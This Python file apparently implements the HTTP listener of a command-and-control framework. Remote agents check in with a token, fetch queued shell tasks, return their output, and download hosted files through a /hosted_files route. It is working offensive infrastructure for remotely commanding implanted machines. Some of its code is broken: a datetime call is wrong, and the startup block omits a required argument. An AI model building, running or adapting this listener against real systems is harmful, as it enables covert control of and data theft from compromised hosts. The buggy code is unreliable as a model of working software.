from flask import Flask, request, render_template, redirect, send_from_directory, make_response, jsonify
import random
import base64
#from agent import *
import requests
import re
import os
import json
from datetime import datetime
from libs.agents.agent import *
from libs.utils.utils import *
from libs.utils.db_commands import *

class HTTP_Handler:

    def __init__(self,port:int,host:str,ssl:bool,active:bool,db_path:str,admin_key:str|None=None,secret_key:str|None=None,agents_using_listener:list|None=None)->object:
        self.port = port
        self.host = host
        self.ssl = ssl
        self.listener = None
        self.active = active
        self.db_path = db_path
        self.secret_key = secret_key or base64.b64encode(base64.a85encode(b"token-"+"".join([random.choice("azertyuiopmlkjhgfdsqwxcvbn1234567890AZERTYUIOPMLKJHGFDSQWXCVBN") for _ in range(random.randint(25,30))]).encode())).decode()
        self.admin_key = admin_key or base64.b64encode(base64.a85encode(b"token-"+"".join([random.choice("azertyuiopmlkjhgfdsqwxcvbn1234567890AZERTYUIOPMLKJHGFDSQWXCVBN!?-_/\\$") for _ in range(random.randint(30,50))]).encode())).decode()
        self.agents_using_listener = agents_using_listener or []
        self.init_listener()

    def _is_authorization_valid(self,request_header:object)->bool:
        if "X-Auth" in request_header.keys():
            token = request_header.get("X-Auth")
            return token == self.secret_key
        else:
            return False
    
    def _is_admin_authorization_valid(self,request_header:object)->bool:
        if "X-Auth" in request_header.keys():
            token = request_header.get("X-Auth")
            return token == self.admin_key
        else:
            return False

    def init_listener(self)->None:
        listener = Flask(__name__)

        @listener.route("/checkin")
        def checkin():
            if self._is_authorization_valid(request.headers):
                if "Identifier" in request.headers.keys():
                    agent_id = request.headers.get("Identifier")
                    all_id = [agent.id for agent in self.agents_using_listener]
                    if agent_id not in all_id:
                        log_info("Agent checkin","listener")
                        agent = Agent(None,agent_id)
                        self.agents_using_listener.append(agent)
                        return "True"
                else:
                    log_info("No identifier specified for adding agent","listener")
            else:
                log_info("Authentication not valid for adding agent","listener")
            log_info("Agent rejected","listener")
            return "False"
        
        @listener.route("/command",methods=["GET"])
        def command():
            if self._is_authorization_valid(request.headers):
                agent_connected = False
                if "Identifier" in request.headers.keys():
                    agent_id = request.headers.get("Identifier")
                    for agent in self.agents_using_listener:
                        if agent.id == agent_id:
                            agent_connected = True
                            agent.last_seen = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            command_to_run = self.get_commands_by_agent_id(agent_id)
                            if command_to_run:
                                return json.dumps(command_to_run)
                            else:
                                return ""
                    if not agent_connected:
                        return "registration_error"
                               
            return ""


        @listener.route("/output",methods=["POST"])
        def output():
            if self._is_authorization_valid(request.headers):
                if "Identifier" in request.headers.keys():
                    agent_id = request.headers.get("Identifier")
                    for agent in self.agents_using_listener:
                        if agent.id == agent_id:
                            data = request.json
                            json_output = json.loads(data["command_output"])
                            task_id = json_output[0]["task_id"]
                            db_exec(add_output_to_task(task_id,json_output[0]["output"]),self.db_path)
                            db_exec(set_job_finished(task_id),self.db_path)
                            #agent.output_file.append(data)
                            return ""

            return ""

        @listener.route("/hosted_files",methods=["GET"])
        def hosted_file():
            if request.method == "GET":
                #print(request.args.get("file"))
                if "file" in request.args.keys():
                    try:
                        filename = request.args.get("file")
                    except:
                        return ""
                    if re.match(r"[a-z0-9A-Z_-]+\.[a-z]{1,6}",filename):
                        return send_from_directory(listener.instance_path.replace("instance","")+"handlers/hosted_files/",f"{filename}")
                    else:
                        return ""
            return ""

        @listener.route("/get_agents")
        def display():
            if self._is_admin_authorization_valid(request.headers):
                dict_of_agents = {}
                for agent in self.get_all_agents():
                    dict_of_agents[agent.id]=agent.__dict__
                return json.dumps(dict_of_agents)

            return ""



        self.listener = listener

    def start_listener(self)->None:
        #print(self.secret_key)
        #print(self.admin_key)
        self.active = True
        if self.ssl:
            self.listener.run(host=self.host,port=self.port,ssl_context="adhoc")
        else:
            self.listener.run(host=self.host,port=self.port)
    
    def get_commands_by_agent_id(self,agent_id:str):
        first_command = db_exec(get_tasked_job_for_agent(agent_id),self.db_path)
        if len(first_command)!=0:
            first_command = first_command[0]
            db_exec(set_job_running(first_command[0]),self.db_path)
        else:
            return False
        return {"task_id":first_command[0],"method":first_command[2],"arguments":base64.b64decode(first_command[3].encode()).decode()}

    def stop_listener(self)->None:
        self.active = False
    
    def get_all_agents(self)->list:
        return self.agents_using_listener
    


if __name__ == '__main__':
    app = HTTP_Handler(8080,"0.0.0.0",1)
    print(app.__dict__)
    app.start_listener()